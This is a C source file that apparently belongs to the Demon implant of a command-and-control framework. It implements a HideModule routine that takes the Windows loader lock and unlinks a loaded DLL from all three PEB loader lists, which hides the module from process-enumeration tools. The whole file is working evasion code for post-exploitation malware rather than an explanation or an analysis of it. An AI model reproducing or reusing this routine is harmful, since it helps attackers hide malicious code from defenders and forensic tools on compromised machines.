#include <Demon.h>
#include <core/MemoryHide.h>

/* HideModule - unlinks a loaded module from all three PEB LDR lists so that
 * usermode enumeration tools (e.g. CreateToolhelp32Snapshot, EnumProcessModules)
 * cannot find it.  Base must be the DllBase returned by LdrModuleLoad / LoadLibrary. */
VOID HideModule( PVOID Base )
{
    /* typedefs for inline-resolved loader lock functions */
    typedef NTSTATUS ( NTAPI *fnLdrLockLoaderLock   )( ULONG Flags, PULONG Disposition, PULONG_PTR Cookie );
    typedef NTSTATUS ( NTAPI *fnLdrUnlockLoaderLock )( ULONG Flags, ULONG_PTR Cookie );

    if ( !Base ) {
        return;
    }

    if ( !Instance->Teb )
        Instance->Teb = NtCurrentTeb();

    PPEB Peb = Instance->Teb->ProcessEnvironmentBlock;

    if ( !Peb || !Peb->Ldr ) {
        return;
    }

    PRINTF( "HideModule: Base=%p\n", Base );

    /* resolve loader lock functions inline - guards concurrent PEB LDR list modification */
    fnLdrLockLoaderLock   pLdrLock   = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_LDRLOCKLOADERLOCK );
    fnLdrUnlockLoaderLock pLdrUnlock = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_LDRUNLOCKLOADERLOCK );

    ULONG_PTR Cookie = 0;
    /* acquire LoaderLock - serialises against any concurrent PEB LDR list walker or loader */
    if ( pLdrLock ) pLdrLock( 0, NULL, &Cookie );

    PLIST_ENTRY Head  = &Peb->Ldr->InLoadOrderModuleList;
    PLIST_ENTRY Entry = Head->Flink;

    /* Walk InLoadOrderModuleList looking for the entry whose DllBase matches */
    while ( Entry != Head )
    {
        PLDR_DATA_TABLE_ENTRY Mod = CONTAINING_RECORD( Entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks );

        /* Advance before any potential unlink so the loop pointer stays valid */
        Entry = Entry->Flink;

        PRINTF( "HideModule: scanning DllBase=%p Name=%ls\n",
                Mod->DllBase,
                Mod->BaseDllName.Buffer ? Mod->BaseDllName.Buffer : L"(null)" )

        if ( Mod->DllBase == Base )
        {
            PRINTF( "HideModule: match - unlinking DllBase=%p Name=%ls\n",
                    Mod->DllBase,
                    Mod->BaseDllName.Buffer ? Mod->BaseDllName.Buffer : L"(null)" )

            /* Unlink from InLoadOrderModuleList */
            Mod->InLoadOrderLinks.Blink->Flink = Mod->InLoadOrderLinks.Flink;
            Mod->InLoadOrderLinks.Flink->Blink = Mod->InLoadOrderLinks.Blink;

            /* Unlink from InMemoryOrderModuleList */
            Mod->InMemoryOrderLinks.Blink->Flink = Mod->InMemoryOrderLinks.Flink;
            Mod->InMemoryOrderLinks.Flink->Blink = Mod->InMemoryOrderLinks.Blink;

            /* Unlink from InInitializationOrderModuleList */
            Mod->InInitializationOrderLinks.Blink->Flink = Mod->InInitializationOrderLinks.Flink;
            Mod->InInitializationOrderLinks.Flink->Blink = Mod->InInitializationOrderLinks.Blink;

            PRINTF( "HideModule: unlinked DllBase=%p Name=%ls from all three PEB LDR lists\n",
                    Mod->DllBase,
                    Mod->BaseDllName.Buffer ? Mod->BaseDllName.Buffer : L"(null)" )
            if ( pLdrUnlock ) pLdrUnlock( 0, Cookie );
            return;
        }
    }

    if ( pLdrUnlock ) pLdrUnlock( 0, Cookie );
    PRINTF( "HideModule: entry not found in PEB for Base=%p\n", Base )
}
